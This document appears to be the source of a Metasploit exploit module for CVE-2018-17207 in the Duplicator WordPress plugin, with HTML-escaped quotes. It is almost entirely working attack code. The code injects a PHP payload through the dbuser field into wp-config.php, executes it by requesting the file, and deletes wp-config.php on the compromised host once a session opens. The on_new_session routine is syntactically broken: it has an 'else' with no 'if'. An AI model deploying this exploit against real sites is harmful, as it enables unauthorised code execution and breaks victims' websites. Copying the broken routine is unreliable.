# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking # this module overwrites the configuration file, breaking the website

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Snap Creek Duplicator WordPress plugin code injection&#039;,
      &#039;Description&#039;     => %q{
        When the WordPress plugin Snap Creek Duplicator restores a backup, it
        leaves dangerous files in the filesystem such as installer.php and
        installer-backup.php. These files allow anyone to call a function that
        overwrite the wp-config.php file AND this function does not sanitize
        POST parameters before inserting them inside the wp-config.php file,
        leading to arbitrary PHP code execution.
        WARNING: This exploit WILL break the wp-config.php file. If possible try
        to restore backups of the configuration after the exploit to make the
        WordPress site work again.
      },
      &#039;Author&#039;          => [
        &#039;Julien Legras <julien.legras@synacktiv.com>&#039;,
        &#039;Thomas Chauchefoin <thomas.chauchefoin@synacktiv.com>&#039;
      ],
      &#039;References&#039;     => [
        [&#039;URL&#039;, &#039;https://www.synacktiv.com/ressources/advisories/WordPress_Duplicator-1.2.40-RCE.pdf&#039;],
        [&#039;WPVDB&#039;, &#039;9123&#039;],
        [&#039;CVE&#039;, &#039;2018-17207&#039;]
      ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => &#039;Aug 29 2018&#039;,
      &#039;DefaultOptions&#039;  =>
      {
      },
      &#039;Platform&#039;        => &#039;php&#039;,
      &#039;Arch&#039;            => ARCH_PHP,
      &#039;Targets&#039;         => [[&#039;WordPress Duplicator <= 1.2.40&#039;, {}]],
      &#039;DefaultTarget&#039;   => 0))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, "The TARGETURI where installer.php or installer-backup.php is located", "/installer.php"]),
      OptInt.new(&#039;TIMEOUT&#039;, [ true, &#039;Timeout for web requests&#039;, 40]),
      ])
  end

  def check
    tpath = normalize_uri(datastore[&#039;TARGETURI&#039;])

    vprint_status("Checking URI #{rhost+tpath}")
    response = send_request_cgi({ &#039;uri&#039; => tpath}, timeout=datastore[&#039;TIMEOUT&#039;])

    unless response
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless response.code == 200
      vprint_error("Server responded with #{response.code}")
      return CheckCode::Safe
    end

    version = response.body.to_s.scan( /version: ([^<]*)</).last.first
    if Gem::Version.new(version) <= Gem::Version.new("1.2.40")
      return CheckCode::Vulnerable
    else
      return CheckCode::Detected
    end

  end

  def create_wp_config_file
    # 1. GET the installer.php to retrieve the archive name.
    response = send_request_cgi({&#039;uri&#039; => normalize_uri(datastore[&#039;TARGETURI&#039;])}, timeout=datastore[&#039;TIMEOUT&#039;])
    unless response && response.code == 200
      fail_with(Failure::NotFound, "Failed to retrieve the archive name, cannot create the wp-config.php file.")
    end
    archive_name = response.body.to_s.scan(/value="([^"]*.zip)"/).flatten.first
    if archive_name.blank?
      fail_with(Failure::NotFound, "Failed to retrieve the archive name, cannot create the wp-config.php file.")
    end

    print_status("Found archive name #{archive_name}")

    # 2. Perform the 1st step to actually create the wp-config.php file.
    response = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;]),
      &#039;vars_post&#039;   => {
        &#039;action_ajax&#039; => "1",
        &#039;action_step&#039; => "1",
        &#039;archive_name&#039; => archive_name,
        &#039;archive_engine&#039; => "ziparchive",
        &#039;exe_safe_mode&#039; => "0",
        &#039;archive_filetime&#039; => "current",
        &#039;logging&#039; => "1"
      }
    }, timeout=datastore[&#039;TIMEOUT&#039;])
    unless response && response.code == 200
      fail_with(Failure::Unknown, "The archive file #{archive_name} was probably deleted.")
    end

    print_status("Successfully created the wp-config.php file!")
  end

  def exploit
    print_status("Checking if the wp-config.php file already exists...")
    tpath_wp_config = normalize_uri(datastore[&#039;TARGETURI&#039;] + &#039;/../wp-config.php&#039;)
    response = send_request_cgi({ &#039;uri&#039; => tpath_wp_config}, timeout=datastore[&#039;TIMEOUT&#039;])

    if response && response.code == 404 # we have to perform action_step 1 to create the wp-config.php file.
      print_status("This WordPress was not restored. Creating the wp-config.php file...")
      create_wp_config_file
    end

    # 2. Exploit the code injection.
    print_status("All good! Injecting PHP code in the wp-config.php file...")
    response = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;]),
      &#039;vars_post&#039;   => {
        &#039;action_ajax&#039; => "3",
        &#039;action_step&#039; => "3",
        &#039;dbhost&#039; => rand_text_alphanumeric(20),
        &#039;dbname&#039; => rand_text_alphanumeric(20),
        &#039;dbpass&#039; => rand_text_alphanumeric(20),
        &#039;dbuser&#039; => "&#039;);?>" + payload.encoded + "/*",
        &#039;dbport&#039; => rand_text_numeric(5)
      }
    }, timeout=datastore[&#039;TIMEOUT&#039;])

    if response && response.code == 200
      print_status("Requesting wp-config.php to execute the payload...")
      send_request_cgi({ &#039;uri&#039; => tpath_wp_config }, timeout=datastore[&#039;TIMEOUT&#039;])
    else
      print_error("Failed to inject PHP code in wp-config.php...")
    end
  end

  def on_new_session(client)
      client.core.use(&#039;stdapi&#039;) unless client.ext.aliases.include?(&#039;stdapi&#039;)
      client.fs.file.rm(&#039;wp-config.php&#039;)
    else
      client.shell_command_token(&#039;rm wp-config.php&#039;)
    end
    print_status("Attempting to recreate wp-config file...")
    create_wp_config_file
  end
end

